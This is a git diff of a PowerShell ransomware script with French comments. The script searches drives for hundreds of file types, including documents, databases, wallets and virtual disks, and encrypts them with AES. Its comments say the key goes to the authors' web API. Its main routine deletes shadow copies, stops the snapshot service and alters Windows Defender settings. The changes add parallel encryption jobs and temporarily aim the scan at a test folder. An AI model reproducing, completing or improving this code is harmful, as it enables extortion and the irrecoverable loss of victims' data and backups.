@@ -1,6 +1,6 @@
 function Get-Files($drive){
-    $files = gci "$($drive.Name)" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
-    #$files = gci "C:\Users\ydgaygui\" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
+    #$files = gci "$($drive.Name)" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
+    $files = gci "C:\Users\ydgaygui\Documents\test\" -Recurse  -ErrorAction SilentlyContinue -Include *.contact,*.dbx,*.doc,*.docx,*.jnt,*.jpg,*.mapimail,*.msg,*.oab,*.ods,*.pdf,*.pps,*.ppsm,*.ppt,*.pptm,*.prf,*.pst,*.rar,*.rtf,*.txt,*.wab,*.xls,*.xlsx,*.xml,*.zip,*.1cd,*.3ds,*.3g2,*.3gp,*.7z,*.7zip,*.accdb,*.aoi,*.asf,*.asp,*.aspx,*.asx,*.avi,*.bak,*.cer,*.cfg,*.class,*.config,*.css,*.csv,*.db,*.dds,*.dwg,*.dxf,*.flf,*.flv,*.html,*.idx,*.js,*.key,*.kwm,*.laccdb,*.ldf,*.lit,*.m3u,*.mbx,*.md,*.mdf,*.mid,*.mlb,*.mov,*.mp3,*.mp4,*.mpg,*.obj,*.odt,*.pages,*.php,*.psd,*.pwm,*.rm,*.safe,*.sav,*.save,*.sql,*.srt,*.swf,*.thm,*.vob,*.wav,*.wma,*.wmv,*.xlsb,*.3dm,*.aac,*.ai,*.arw,*.c,*.cdr,*.cls,*.cpi,*.cpp,*.cs,*.db3,*.docm,*.dot,*.dotm,*.dotx,*.drw,*.dxb,*.eps,*.fla,*.flac,*.fxg,*.java,*.m,*.m4v,*.max,*.mdb,*.pcd,*.pct,*.pl,*.potm,*.potx,*.ppam,*.ppsm,*.ppsx,*.pptm,*.ps,*.pspimage,*.r3d,*.rw2,*.sldm,*.sldx,*.svg,*.tga,*.wps,*.xla,*.xlam,*.xlm,*.xlr,*.xlsm,*.xlt,*.xltm,*.xltx,*.xlw,*.act,*.adp,*.al,*.bkp,*.blend,*.cdf,*.cdx,*.cgm,*.cr2,*.crt,*.dac,*.dbf,*.dcr,*.ddd,*.design,*.dtd,*.fdb,*.fff,*.fpx,*.h,*.iif,*.indd,*.jpeg,*.mos,*.nd,*.nsd,*.nsf,*.nsg,*.nsh,*.odc,*.odp,*.oil,*.pas,*.pat,*.pef,*.pfx,*.ptx,*.qbb,*.qbm,*.sas7bdat,*.say,*.st4,*.st6,*.stc,*.sxc,*.sxw,*.tlg,*.wad,*.xlk,*.aiff,*.bin,*.bmp,*.cmt,*.dat,*.dit,*.edb,*.flvv,*.gif,*.groups,*.hdd,*.hpp,*.log,*.m2ts,*.m4p,*.mkv,*.mpeg,*.ndf,*.nvram,*.ogg,*.ost,*.pab,*.pdb,*.pif,*.png,*.qed,*.qcow,*.qcow2,*.rvt,*.st7,*.stm,*.vbox,*.vdi,*.vhd,*.vhdx,*.vmdk,*.vmsd,*.vmx,*.vmxf,*.3fr,*.3pr,*.ab4,*.accde,*.accdr,*.accdt,*.ach,*.acr,*.adb,*.ads,*.agdl,*.ait,*.apj,*.asm,*.awg,*.back,*.backup,*.backupdb,*.bank,*.bay,*.bdb,*.bgt,*.bik,*.bpw,*.cdr3,*.cdr4,*.cdr5,*.cdr6,*.cdrw,*.ce1,*.ce2,*.cib,*.craw,*.crw,*.csh,*.csl,*.db_journal,*.dc2,*.dcs,*.ddoc,*.ddrw,*.der,*.des,*.dgc,*.djvu,*.dng,*.drf,*.dxg,*.eml,*.erbsql,*.erf,*.exf,*.ffd,*.fh,*.fhd,*.gray,*.grey,*.gry,*.hbk,*.ibank,*.ibd,*.ibz,*.iiq,*.incpas,*.jpe,*.kc2,*.kdbx,*.kdc,*.kpdx,*.lua,*.mdc,*.mef,*.mfw,*.mmw,*.mny,*.moneywell,*.mrw,*.myd,*.ndd,*.nef,*.nk2,*.nop,*.nrw,*.ns2,*.ns3,*.ns4,*.nwb,*.nx2,*.nxl,*.nyf,*.odb,*.odf,*.odg,*.odm,*.orf,*.otg,*.oth,*.otp,*.ots,*.ott,*.p12,*.p7b,*.p7c,*.pdd,*.pem,*.plus_muhd,*.plc,*.pot,*.pptx,*.psafe3,*.py,*.qba,*.qbr,*.qbw,*.qbx,*.qby,*.raf,*.rat,*.raw,*.rdb,*.rwl,*.rwz,*.s3db,*.sd0,*.sda,*.sdf,*.sqlite,*.sqlite3,*.sqlitedb,*.sr2,*.srf,*.srw,*.st5,*.st8,*.std,*.sti,*.stw,*.stx,*.sxd,*.sxg,*.sxi,*.sxm,*.tex,*.wallet,*.wb2,*.wpd,*.x11,*.x3f,*.xis,*.ycbcra,*.yuv
     return $files
 }
 
@@ -52,15 +52,6 @@ function Decrypt-String($key, $encryptedStringWithIV) {
     [System.Text.Encoding]::UTF8.GetString($unencryptedData).Trim([char]0)
 }
 
-function Get-All-Files($exts){
-    $files = @()
-    Foreach ($ext in $exts){
-        $file = Get-Files $ext
-        $files += $file
-    }
-    return $files
-}
-
 function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
     $erroractionPreference = "stop"
     try{
@@ -77,7 +68,7 @@ function Not-Too-Big ($file, $key, $aesManaged, $encryptor){
             }
             catch{
                 #Write-Host $_.ScriptStackTrace
-                Write-Host $_
+                #Write-Host $_
             }
     }
 }
@@ -96,20 +87,31 @@ function Too-Big($file, $key){
 }
 
 function Encrypt-All($key, $drive, $aesManaged, $encryptor){
-    $files = Get-Files $drive
-    #Ici séparer les fichiers en plusieurs array
-    ##
-    ##Ici mettre en place les threads qui feront la boucle en même temps sur leurs liste
-    Foreach ($file in $files){
-        $($file.FullName)
-        $toobig = ((Get-Item $($file.FullName)).length/1MB) -gt 30
-        If ($toobig){
-            Too-Big $($file.FullName) $key 
-        }
+    $ScriptBlock = {
+        Foreach ($file in $args){
+            $($file.FullName)
+            $toobig = ((Get-Item $($file.FullName)).length/1MB) -gt 30
+            If ($toobig){
+                Too-Big $($file.FullName) $key 
+            }
 
-        Else{
-            Not-Too-Big $($file.FullName) $key $aesManaged $encryptor
+            Else{
+                try{
+                    Not-Too-Big $($file.FullName) $key $aesManaged $encryptor
+                }
+                catch {
+                    Write-Host $_
+                }
+            }
         }
+    }
+    $files = Get-Files $drive 
+    $files
+    #Séparer la liste de fichiers en chunck de 70
+    $split_files = for($i=0; $i -lt $files.length; $i+=70){ ,($files[$i],$files[$i+1],$files[$i+2],$files[$i+3])}
+    Foreach ($files in $split_files){
+        Start-Job -scriptblock $ScriptBlock -ArgumentList $files
+    #Get-Job | Wait-Job 
     }
 }
 
@@ -126,7 +128,7 @@ function Decrypt-All($key){
 
 function main{
     $erroractionPreference="stop"
-    try{
+   <#try{
         # Remove all snapshots
         gwmi Win32_Shadowcopy|%{if($($_.ClientAccessible) -eq "True"){$_.Delete()}};
          # Stop the Volume Snapshot Service
@@ -188,7 +190,7 @@ function main{
     $reg.DeleteValue($hkcu, $key, "Windows Defender")|out-null;
     $key="SOFTWARE\Policies\Microsoft\Windows Defender";
     #List al the drives in the computer
-    $drives=gwmi Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4"|select Name;
+    $drives=gwmi Win32_LogicalDisk -Filter "DriveType=3 or DriveType=4"|select Name;#>
     #Créée la clé AES
     $key = Create-AesKey
     #Envoie la clé AES à notre API Web
@@ -200,8 +202,12 @@ function main{
     $aesManaged = Create-AesManagedObject $key
     $encryptor = $aesManaged.CreateEncryptor()
     #Si plusieurs disques, faire un thread par disque 
+    #$ScriptBlock = {Encrypt-All $key $args $aesManaged $encryptor}
+    $drive
     foreach ($drive in $drives){
         Encrypt-All $key $drive $aesManaged $encryptor
+        #Start-Job -ScriptBlock $ScriptBlock -ArgumentList $drive
     }
+    #Get-Job | Wait-Job 
     $aesManaged.Dispose()
 }
